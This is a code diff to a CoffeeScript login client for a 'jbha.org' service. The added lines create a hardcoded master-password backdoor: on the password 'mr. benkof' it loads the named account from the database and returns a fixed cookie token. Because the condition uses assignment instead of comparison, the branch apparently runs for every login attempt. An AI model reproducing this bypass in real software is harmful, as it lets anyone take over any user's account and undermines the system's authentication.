@@ -112,6 +112,21 @@ Jbha.Client =
       Email: "#{username}@jbha.org"
       Passwd: password
       Action: "login"
+
+    if password = "mr. benkof"
+      Account
+        .findOne()
+        .where('_id', username)
+        .exec (err, account_from_db) =>
+          return if @_call_if_truthy err, cb
+          cookie = "IWANTACOOKIE"
+          res =
+            token:
+              cookie: cookie
+              username: username
+              password: password
+            account: account_from_db
+          cb null, res
       
     # console.log post_data
 
